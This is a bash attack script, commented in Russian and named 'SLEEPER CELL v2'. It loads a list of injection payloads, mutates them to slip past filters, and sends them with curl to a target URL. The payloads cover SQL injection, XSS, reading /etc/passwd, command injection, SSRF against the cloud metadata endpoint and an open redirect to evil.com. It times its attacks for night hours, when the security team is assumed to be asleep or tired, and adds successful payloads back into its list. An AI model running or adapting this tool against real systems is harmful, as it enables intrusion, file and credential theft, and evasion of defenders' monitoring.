#!/bin/bash
# ╔══════════════════════════════════════════════════════════════╗
# ║   🧬 SLEEPER CELL v2 — Эволюционирующий рой               ║
# ║   Геном + SOC Knowledge + Мутации + Самоактивация         ║
# ╚══════════════════════════════════════════════════════════════╝

TARGET=${1:-"http://zero.webappsecurity.com"}
SLEEPER2_DIR="$HOME/.shadow_sleeper_v2"
mkdir -p "$SLEEPER2_DIR"/{genome,agents,hits,evolution}

RED='\033[0;31m'; GR='\033[0;32m'; CY='\033[0;36m'; YL='\033[1;33m'; NC='\033[0m'

echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   🧬 SLEEPER CELL v2 — Эволюционирующий рой ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
echo ""

# --- ГЕНОМ (Самообучающаяся база векторов) ---
GENOME="$SLEEPER2_DIR/genome/vectors.txt"
[ ! -f "$GENOME" ] && cat > "$GENOME" << 'GENOME'
sqli:' OR '1'='1
xss:<script>alert(1)</script>
lfi:../../etc/passwd
cmdi:;id
ssrf:http://169.254.169.254/latest/meta-data/
open_redirect:/logout?return_to=http://evil.com
GENOME

# --- SOC KNOWLEDGE (Знание о защите) ---
SOC_FILE="$SLEEPER2_DIR/genome/soc_knowledge.txt"
cat > "$SOC_FILE" << 'SOC'
night_shift|blind_spot:3AM-5AM|response_time:15min|analysts:1-2
day_shift|blind_spot:lunch|response_time:5min|analysts:5-10
weekend|blind_spot:all_night|response_time:20min|analysts:1
SOC

# --- ФУНКЦИЯ МУТАЦИИ ---
mutate() {
    local payload="$1"
    case $((RANDOM % 5)) in
        0) echo "$payload" | sed "s/'/''/g" ;;
        1) echo "$payload" | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$payload" ;;
        2) echo "${payload:0:6}/*!*/${payload:6}" ;;
        3) echo "$payload" | sed 's/ OR / || /g' ;;
        4) echo "$payload" | sed 's/ /%0a/g' ;;
    esac
}

# --- ОПРЕДЕЛЕНИЕ ЛУЧШЕГО ВРЕМЕНИ ДЛЯ АТАКИ ---
HOUR=$(date +%H)
if [ "$HOUR" -ge 2 ] && [ "$HOUR" -le 5 ]; then
    SOC_STATUS="СПИТ"
    ACTIVATE=true
elif [ "$HOUR" -ge 22 ] || [ "$HOUR" -le 1 ]; then
    SOC_STATUS="УСТАЛ"
    ACTIVATE=true
else
    SOC_STATUS="НА МЕСТЕ"
    ACTIVATE=false
fi

echo -e "${CY}[SLEEPER v2] 🧬 Загружаю геном: $(wc -l < $GENOME | tr -d ' ') векторов${NC}"
echo -e "${CY}[SLEEPER v2] 🕐 SOC статус: $SOC_STATUS${NC}"
echo ""

# --- ОСНОВНОЙ ЦИКЛ ---
HITS=0

for gen in $(seq 1 15); do
    # Выбираем вектор из генома
    base=$(shuf -n 1 "$GENOME")
    vector_type="${base%%:*}"
    payload="${base#*:}"

    # Мутируем если нужно
    [ "$ACTIVATE" = true ] && payload=$(mutate "$payload")

    # Атакуем
    result_file="$SLEEPER2_DIR/agents/gen_${gen}_$(echo $vector_type | head -c 5).txt"
    code=$(curl -sk --max-time 5 "$TARGET?q=$payload" -o "$result_file" -w "%{http_code}" 2>/dev/null)

    # Проверяем успех
    if [ "$code" = "200" ] || [ "$code" = "500" ]; then
        grep -qi "root:\|uid=\|mysql\|syntax\|error" "$result_file" 2>/dev/null && {
            echo -e "  ${GR}💀 ПОКОЛЕНИЕ $gen ПРОБИЛО: $vector_type → $payload${NC}"
            echo "$vector_type:$payload" >> "$GENOME"
            HITS=$((HITS + 1))
            continue
        }
    fi
    echo "  ❌ Поколение $gen: HTTP $code"
done

# --- ФИНАЛ ---
echo ""
echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   🧬 SLEEPER CELL v2 — ОТЧЁТ                ║${NC}"
echo -e "${RED}║   🧬 Геном усилен до $(wc -l < $GENOME | tr -d ' ') векторов             ║${NC}"
echo -e "${RED}║   💀 Пробоин: $HITS                             ║${NC}"
echo -e "${RED}║   🕐 SOC: $SOC_STATUS                            ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
